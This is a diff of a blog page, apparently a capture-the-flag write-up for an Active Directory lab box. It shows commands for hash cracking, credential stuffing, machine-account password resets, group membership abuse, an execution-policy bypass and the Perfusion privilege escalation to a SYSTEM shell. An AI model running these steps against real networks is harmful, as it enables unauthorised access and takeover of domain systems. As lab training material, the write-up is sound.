-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>~/Wordlists/rockwe.txt accdb.hash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>~/Wordlists/rockwe.txt accdb.hash
 </span></span></code></pre></div><p>We get a hit! <code>class08</code>.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-21-060213_.png" alt=""  />
 </p>
 </p>
 <p>With any password it&rsquo;s worth doing some credential stuffing but as we can see no hits.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u Users.txt -p Passwords.txt --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u Users.txt -p Passwords.txt --shares
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-21-060617_.png">
 </figure>
 
@@ -792,7 +792,7 @@ It will then open a microsoft visual basic window where we can see the code for 
 </p>
 
 Let&rsquo;s validate the credentials.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --shares
 </span></span></code></pre></div><p>As we can see they are valid.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-21-070502_.png" alt=""  />
@@ -845,7 +845,7 @@ Because FS01 still has its pre-2k default password, the Kerberos/SMB authenticat
 <p>This indicates the SMB session setup failed. A Kerberos TGT alone doesn&rsquo;t guarantee a usable SMB session if the service ticket cannot be generated/used correctly - the service ticket must be encrypted with keys that match what the SMB service expects. Because FS01&rsquo;s keys/password were not in sync, the IPC$/SMB session setup failed, confirming why we must change FS01&rsquo;s password first.</p>
 <h4 id="modifying-fs01-s-password-using-rpc-samr">Modifying FS01&rsquo;s Password Using <code>RPC-SAMR</code></h4>
 <p>We can use <code>impacket-changepasswd</code> for this with the <code>rpc-samr</code> flag, this updates via SAMR not LDAP.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-changepasswd $domain/FS01<span style="color:#ae81ff">\$</span>:fs01@$box -newpass StR0ngP@sSw0rd! -p rpc-samr
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-changepasswd $domain/FS01<span style="color:#ae81ff">\$</span>:fs01@$box -newpass StR0ngP@sSw0rd! -p rpc-samr
 </span></span></code></pre></div><p>As we can see this succeeded, so now we have usable credentials that SAMBA can present for SMB/SAMR Authentication.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-28-070908.png" alt=""  />
@@ -854,7 +854,7 @@ Because FS01 still has its pre-2k default password, the Kerberos/SMB authenticat
 <p>As you can see this is successful.</p>
 <h4 id="changing-the-admws01-password-using-samr-path--with-samba">Changing the ADMWS01$ Password Using SAMR Path (with Samba):</h4>
 <p>Now we can modify the ADMWS01$ password using <code>net rpc</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Change the password for the computer account &#39;ADMWS01$&#39; to &#39;MyN3wP@$$w0rd!&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Change the password for the computer account &#39;ADMWS01$&#39; to &#39;MyN3wP@$$w0rd!&#39;</span>
 </span></span><span style="display:flex;"><span>net rpc password <span style="color:#e6db74">&#39;ADMWS01$&#39;</span> <span style="color:#e6db74">&#39;MyN3wP@$$w0rd!&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>  -U <span style="color:#e6db74">&#39;retro2.vl/fs01$&#39;</span>%<span style="color:#e6db74">&#39;StR0ngP@sSw0rd!&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>  -S <span style="color:#e6db74">&#39;BLN01.retro2.vl&#39;</span>
@@ -951,21 +951,21 @@ Because FS01 still has its pre-2k default password, the Kerberos/SMB authenticat
 <p>Now we have control over the <code>ADMWS01$</code> account we can add <code>ldapreader</code> to the Services group.</p>
 <p>+Note+: Remember we are going to run the following commands in the context of the ADMWS01$ machine account.</p>
 <p>First let&rsquo;s verify who is a member of the group</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net rpc group members <span style="color:#e6db74">&#34;SERVICES&#34;</span> -U $DOMAIN/$user%$pass -S $box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net rpc group members <span style="color:#e6db74">&#34;SERVICES&#34;</span> -U $DOMAIN/$user%$pass -S $box
 </span></span></code></pre></div><p>As we can see only <code>inventory</code> is part of the group.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-10-05-141601.png" alt=""  />
 </p>
 </p>
 <p>We will add ldapreader to the group.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net rpc group addmem <span style="color:#e6db74">&#34;SERVICES&#34;</span> <span style="color:#e6db74">&#34;LDAPREADER&#34;</span> -U $DOMAIN/$user%$pass -S $box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net rpc group addmem <span style="color:#e6db74">&#34;SERVICES&#34;</span> <span style="color:#e6db74">&#34;LDAPREADER&#34;</span> -U $DOMAIN/$user%$pass -S $box
 </span></span></code></pre></div><p>As we can see there is no output again.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-28-083849.png" alt=""  />
 </p>
 </p>
 <p>We can re-run our initial command to verify it worked.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net rpc group members <span style="color:#e6db74">&#34;SERVICES&#34;</span> -U $DOMAIN/$user%$pass -S $box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net rpc group members <span style="color:#e6db74">&#34;SERVICES&#34;</span> -U $DOMAIN/$user%$pass -S $box
 </span></span></code></pre></div><p>It worked!
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-28-083913.png" alt=""  />
@@ -973,7 +973,7 @@ Because FS01 still has its pre-2k default password, the Kerberos/SMB authenticat
 </p>
 <h3 id="rdping-onto-the-dc-as-ldapreader">RDPing Onto The DC as ldapreader:</h3>
 <p>Now we can rdp in using the <code>ldapreader</code> account creds we found earlier.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>xfreerdp3 /v:$box /u:$user /p:$pass /d:$domain /drive:/tmp,/home/kali/windowsTools /sec:rdp +clipboard
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>xfreerdp3 /v:$box /u:$user /p:$pass /d:$domain /drive:/tmp,/home/kali/windowsTools /sec:rdp +clipboard
 </span></span></code></pre></div><p>Let&rsquo;s get our flag.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-28-085651.png" alt=""  />
@@ -983,7 +983,7 @@ Because FS01 still has its pre-2k default password, the Kerberos/SMB authenticat
 <h3 id="finding-a-privesc-path-with-privesccheck-perfusion">Finding a Privesc Path with PrivescCheck: Perfusion:</h3>
 <p>After manually enumerating the box I could not find a clear route forward so I decided to use <a href="https://github.com/itm4n/PrivescCheck"  target="_blank" rel="noreferrer nofollow">PrivescCheck</a>
  to run automated privilege escalation scan.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -ep bypass -c <span style="color:#e6db74">&#34;. .\PrivescCheck.ps1; Invoke-PrivescCheck&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -ep bypass -c <span style="color:#e6db74">&#34;. .\PrivescCheck.ps1; Invoke-PrivescCheck&#34;</span>
 </span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-10-05-172628.png" alt=""  />
 </p>
@@ -1115,7 +1115,7 @@ If you already have an understanding of subkeys jump ahead to <a href="#back-to-
 <li><code>Run</code> is a <strong>subkey</strong> of <code>CurrentVersion</code> (this key contains <strong>values</strong> that tell Windows what programs to start)</li>
 </ul>
 <p><strong>Visual representation of above</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>HKEY_LOCAL_MACHINE
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>HKEY_LOCAL_MACHINE
 </span></span><span style="display:flex;"><span>└─ SOFTWARE
 </span></span><span style="display:flex;"><span>   └─ Microsoft
 </span></span><span style="display:flex;"><span>      └─ Windows
@@ -1126,7 +1126,7 @@ If you already have an understanding of subkeys jump ahead to <a href="#back-to-
 </span></span><span style="display:flex;"><span>               └─ SecurityTool ← value
 </span></span></code></pre></div><p>+In plain English+: A <strong>subkey</strong> is just a key that lives <strong>under</strong> another key. This is why a key can contain other keys (subkeys) and values. Values have a name, a type (<code>REG_SZ</code>, <code>REG_DWORD</code>, <code>REG_BINARY</code>) and data.</p>
 <p>If we want to view the subkeys of a key we can use the below commands.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># CMD: list immediate subkeys of CurrentVersion</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># CMD: list immediate subkeys of CurrentVersion</span>
 </span></span><span style="display:flex;"><span>reg query <span style="color:#e6db74">&#34;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># CMD: show a specific value (e.g., &#39;ProgramFilesDir&#39;)</span>
@@ -1200,7 +1200,7 @@ If you already have an understanding of subkeys jump ahead to <a href="#back-to-
 .</p>
 <p>He uses WMI to query the performance classes (simple &amp; reliable):</p>
 <p><strong>Powershell</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-WmiObject Win32_Perf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-WmiObject Win32_Perf
 </span></span><span style="display:flex;"><span>Get-WmiObject Win32_PerfRawData
 </span></span><span style="display:flex;"><span>Get-WmiObject Win32_PerfFormattedData
 </span></span></code></pre></div><p><strong>But why</strong>? Running any of the above queries causes the WMI service to enumerate performance providers and, in turn, <strong>load the DLL</strong> according to the <code>Performance</code> key. Which on vulnerable builds (such as this), the DLL is often loaded as <code>NT AUTHORITY\SYSTEM</code> inside a WMI provider process.</p>
@@ -1256,7 +1256,7 @@ Now we just need to build(compile) the binary.
 <p>We can use our existing shared folder to get the exploit onto the machine.</p>
 <h3 id="getting-a-system-shell-using-perfusion">Getting A System Shell Using Perfusion:</h3>
 <p>Now all we have to do is run it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\Perfusion -c cmd -i
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\Perfusion -c cmd -i
 </span></span></code></pre></div><p>And we have an <code>NT AUTHORITY\SYSTEM</code> shell
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-10-06-131921.png" alt=""  />
@@ -1454,6 +1454,13 @@ document.addEventListener("DOMContentLoaded", function() {
 <script>
 window.store = {
     
+    "\/\/uildDrafts:1313\/tags\/ansible\/": {
+        "title": "Ansible",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
+    },
+    
     "\/\/uildDrafts:1313\/author\/": {
         "title": "Author",
         "tags": [],
@@ -1461,11 +1468,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/author\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/blind\/": {
-        "title": "Blind",
+    "\/\/uildDrafts:1313\/tags\/automation\/": {
+        "title": "Automation",
         "tags": [],
         "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
+        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
     },
     
     "\/\/uildDrafts:1313\/author\/bloodstiller\/": {
@@ -1480,6 +1487,55 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
+        "title": "Dotfiles",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/kali\/": {
+        "title": "Kali",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/qemu\/": {
+        "title": "Qemu",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/": {
+        "title": "Security Newsroom Obsidian Plugin Release",
+        "tags": ["kali","automation","qemu","ansible","dotfiles",],
+        "content": "Security Newsroom Obsidian Plugin Release I\u0026rsquo;ve been quiet for a while. Work has been busy \u0026amp; I have been doing some other projects that I can\u0026rsquo;t get into\u0026hellip;\u0026hellip;\nI\u0026rsquo;ve made the switch from my beloved eMacs to obsidian over the last few months and apart from the first week it\u0026rsquo;s been relatively painless. I\u0026rsquo;ve managed to recreate 99% of all eMacs functionality in obsidian (that\u0026rsquo;s functionality I used, not all of eMacs functionality as that would not be possible.)\nOne thing that I have found myself needing is an easy way to keep up with security related news. As the landscape is constantly evolving and growing and there a million different sources to get information from I got bored of jumping around so I thought \u0026ldquo;what if it was just in obsidian\u0026rdquo;. I use obsidian as my web-clipper anyone so let\u0026rsquo;s just put the functionality in here (I say here as I am writing the post in Obsidian)\nSo I decided to create the security newsroom plugin. https://github.com/bloodstiller/obsidian-security-newsroom I\u0026rsquo;ve created a pull request for it to be placed into the official community plugins but so far it has not.\nIt essentially pulls from lots of security resources and allows you to filter, save \u0026amp; clip the whole articles directly within obsidian.\nFull video showing how it works. At the moment as it\u0026rsquo;s not currently approved in the obsidian store if you want to use it you will have to manually add a folder called in your .obsidian/plugins folder called security-newsroom and place the main.js, manifest.json \u0026amp; styles.css from the repo and then load the plugin.\n", 
+        "url": "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/": {
+        "title": "Tags",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/": {
+        "title": "Tools",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tools\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/blind\/": {
+        "title": "Blind",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/ctf-writeup\/": {
@@ -1559,13 +1615,6 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/portswigger\/sqli_lab_15\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/": {
-        "title": "Tags",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/"
-    },
-    
     "\/\/uildDrafts:1313\/tags\/waf\/": {
         "title": "Waf",
         "tags": [],
@@ -1574,7 +1623,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/web-exploitation\/": {
-        "title": "Web-Exploitation",
+        "title": "Web Exploitation",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/web-exploitation\/"
@@ -1987,7 +2036,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/llm\/": {
-        "title": "Llm",
+        "title": "LLM",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/llm\/"
@@ -2442,7 +2491,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/msi\/": {
-        "title": "MSI",
+        "title": "Msi",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/msi\/"
@@ -2838,13 +2887,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/tools\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tools\/": {
-        "title": "Tools",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tools\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/vulnerability-assessment\/": {
@@ -3296,7 +3338,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/ssrf\/": {
-        "title": "Ssrf",
+        "title": "SSRF",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/ssrf\/"
@@ -3806,46 +3848,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/homelab\/20250220118-nixos-homelab\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/ansible\/": {
-        "title": "Ansible",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
-    },
-    
     "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/": {
         "title": "Automating Kali Linux VM Setup: A Comprehensive Guide to QEMU and Ansible Integration",
         "tags": ["kali","automation","qemu","ansible","dotfiles",],
         "content": "As a cybersecurity enthusiast and productivity junkie, I\u0026rsquo;ve always been fascinated by the power of automation. Recently, I decided to streamline my process of setting up Kali Linux virtual machines using QEMU and Ansible. In this article, I\u0026rsquo;ll walk you through how I\u0026rsquo;ve automated the creation and configuration of Kali VMs, complete with my preferred dotfiles and tools.\nThe Need for Automation If you\u0026rsquo;re like me, you probably find yourself creating new Kali VMs frequently for various projects or testing environments. The process of setting up a new VM, updating the system, installing your favorite tools, and configuring your environment can be time-consuming and repetitive. That\u0026rsquo;s where automation comes in handy. You can repurpose this setup for other projects, just change the Ansible playbook and dotfiles.\nBenefits and Challenges This automation setup offers several advantages:\nConsistent environment across all VMs Rapid deployment of new instances Version-controlled configuration (infrastructure as code) Easy sharing and collaboration Some challenges I encountered:\nVirtioFS setup complexity Ansible role organization Package version management Dotfiles synchronization But the benefits far outweigh the initial setup effort.\nPrerequisites Choose your preferred virtualization provider:\nVirtualBox Setup VirtualBox Vagrant Ansible QEMU/KVM Setup (Linux only) (My preferred setup) QEMU/KVM (≥ 4.2) Libvirt (≥ 6.2.0) Vagrant Ansible For QEMU/KVM shared folder support:\nHost: Linux kernel ≥ 5.4\nGuest: Linux kernel ≥ 5.4\nThere is some additional setup required for the vagrant-libvirt plugin so would advise you checkout QEMU/KVM Setup Guide Unable to resolve dependency vagrant-libvirterror: +Update+ 21/02/2025 I recently ran an update and encountered an issue where it refused to launch new VM\u0026rsquo;s. I received an error similar to the below (it was not exactly the same as I had a crash shortly after). Error message given during initialization: Unable to resolve dependency: user requested 'vagrant-libvirt (= 0.12.2)' after alot of searching I found this post I found following the steps resolved the issue. vagrant plugin repair vagrant plugin expunge --reinstall vagrant plugin update VAGRANT_DISABLE_STRICT_DEPENDENCY_ENFORCEMENT=1 vagrant plugin install vagrant-libvirt The Automation Stack My automation setup consists of three main components:\nVagrant for VM provisioning QEMU/KVM for virtualization Ansible for configuration management Let\u0026rsquo;s dive into each component.\n1. Vagrant with QEMU/KVM I chose QEMU/KVM over VirtualBox for several reasons:\nBetter performance on Linux hosts Once you have used KVM/QEMU you will never go back to VirtualBox etc. Native virtualization support VirtioFS for efficient file sharing The Vagrantfile handles:\nVM resource allocation (RAM, CPU) Network configuration Shared folder setup with VirtioFS Ansible provisioner integration Here\u0026rsquo;s the the Vagrantfile:\n# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;kalilinux/rolling\u0026#34; config.vm.hostname = \u0026#34;kali-vm\u0026#34; # Set hostname inside VM # Disable the default share config.vm.synced_folder \u0026#34;.\u0026#34;, \u0026#34;/vagrant\u0026#34;, disabled: true # Force libvirt provider ENV[\u0026#39;VAGRANT_DEFAULT_PROVIDER\u0026#39;] = \u0026#39;libvirt\u0026#39; # QEMU/libvirt specific settings config.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 libvirt.graphics_type = \u0026#34;spice\u0026#34; libvirt.video_type = \u0026#34;qxl\u0026#34; libvirt.title = \u0026#34;Kali Linux VM\u0026#34; # Set VM title in libvirt libvirt.description = \u0026#34;Kali Linux VM for Security Testing\u0026#34; # Optional description # Enable shared memory for VirtioFS libvirt.memorybacking :access, :mode =\u0026gt; \u0026#34;shared\u0026#34; end # Configure shared folders using VirtioFS config.vm.synced_folder \u0026#34;/home/martin/.config/tmuxinator\u0026#34;, \u0026#34;/home/vagrant/.config/tmuxinator\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.02-LinuxTools\u0026#34;, \u0026#34;/home/vagrant/linuxTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools\u0026#34;, \u0026#34;/home/vagrant/windowsTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career\u0026#34;, \u0026#34;/home/vagrant/Dropbox/40-49_Career\u0026#34;, type: \u0026#34;virtiofs\u0026#34; # Network settings config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.57.11\u0026#34; config.ssh.forward_x11 = true # Provisioning configuration for Ansible config.vm.provision \u0026#34;ansible\u0026#34; do |ansible| ansible.playbook = \u0026#34;../../Ansible/configure-kali.yml\u0026#34; end end 2. Ansible Configuration Ansible automates the entire VM setup process. The main playbook handles:\nSystem updates and package installation Development tools setup Security tools installation Terminal environment configuration (Alacritty, Tmux) Editor setup (Doom Emacs) Dotfiles deployment Here\u0026rsquo;s the main Ansible playbook:\n--- - name: Configure Kali Linux hosts: all become: yes # This is equivalent to using sudo vars: user_home: \u0026#34;/home/vagrant\u0026#34; docker_gpg_key_url: \u0026#34;https://download.docker.com/linux/debian/gpg\u0026#34; docker_repo: \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\u0026#34; tasks: - name: Update apt cache apt: update_cache: yes cache_valid_time: 3600 - name: Download Iosevka Nerd Font (be patient big file!) get_url: url: https://github.com/ryanoasis/nerd-fonts/releases/download/v3.3.0/Iosevka.zip dest: /tmp/Iosevka.zip mode: \u0026#39;0644\u0026#39; - name: Install unzip if not present apt: name: unzip state: present - name: Extract Iosevka font unarchive: src: /tmp/Iosevka.zip dest: \u0026#34;/usr/local/share/fonts/\u0026#34; remote_src: yes owner: vagrant group: vagrant - name: Update font cache command: fc-cache -fv become_user: vagrant - name: Install base packages apt: name: - eza - alacritty - git - bat - seclists - git - emacs - ripgrep - fd-find state: present - name: Create docker GPG directory file: path: /etc/apt/keyrings state: directory mode: \u0026#39;0755\u0026#39; - name: Check if Docker GPG key exists stat: path: /etc/apt/keyrings/docker.gpg register: docker_gpg - name: Add Docker GPG key shell: | curl -fsSL {{ docker_gpg_key_url }} | gpg --dearmor -o /etc/apt/keyrings/docker.gpg when: not docker_gpg.stat.exists - name: Check if Docker repository exists stat: path: /etc/apt/sources.list.d/docker.list register: docker_repo_file - name: Add Docker repository copy: content: \u0026#34;{{ docker_repo }}\u0026#34; dest: /etc/apt/sources.list.d/docker.list when: not docker_repo_file.stat.exists - name: Install Docker packages apt: name: - docker-ce - docker-ce-cli - containerd.io update_cache: yes state: present - name: Download Starship install script get_url: url: https://starship.rs/install.sh dest: /tmp/starship-install.sh mode: \u0026#39;0755\u0026#39; register: download_script - name: Install Starship shell: /tmp/starship-install.sh --yes args: creates: /usr/local/bin/starship when: download_script is success async: 180 # 5 minute timeout poll: 5 # Check every 5 seconds - name: Install oh-my-zsh become_user: vagrant shell: sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; \u0026#34;\u0026#34; --unattended args: creates: \u0026#34;{{ user_home }}/.oh-my-zsh\u0026#34; - name: Install zsh plugins become_user: vagrant git: repo: \u0026#34;{{ item.repo }}\u0026#34; dest: \u0026#34;{{ user_home }}/.oh-my-zsh/custom/plugins/{{ item.name }}\u0026#34; loop: - { repo: \u0026#39;https://github.com/zsh-users/zsh-autosuggestions\u0026#39;, name: \u0026#39;zsh-autosuggestions\u0026#39; } - { repo: \u0026#39;https://github.com/zsh-users/zsh-syntax-highlighting.git\u0026#39;, name: \u0026#39;zsh-syntax-highlighting\u0026#39; } - { repo: \u0026#39;https://github.com/marlonrichert/zsh-autocomplete.git\u0026#39;, name: \u0026#39;zsh-autocomplete\u0026#39; } - { repo: \u0026#39;https://github.com/zdharma-continuum/fast-syntax-highlighting.git\u0026#39;, name: \u0026#39;fast-syntax-highlighting\u0026#39; } - name: Install tmuxinator gem: name: tmuxinator state: present - name: Clone Statistically Likely Usernames git: repo: https://github.com/insidetrust/statistically-likely-usernames.git dest: /usr/share/wordlists/statistically-likely-usernames - name: Download and install Kerbrute get_url: url: https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 dest: /usr/local/bin/kerbrute mode: \u0026#39;0755\u0026#39; - name: Install build dependencies for Emacs apt: name: - build-essential - libgccjit-12-dev - libgnutls28-dev - libjansson4 - libjansson-dev - libncurses-dev - libsqlite3-dev - libgif-dev - libjpeg-dev - libpng-dev - libtiff5-dev - libxpm-dev - libwebp-dev - libgtk-3-dev - texinfo - autoconf - automake - pkg-config state: present install_recommends: no register: pkg_result retries: 3 delay: 5 until: pkg_result is success - name: Install tree-sitter separately apt: name: libtree-sitter-dev state: present register: tree_sitter_result retries: 3 delay: 5 until: tree_sitter_result is success - name: Check if 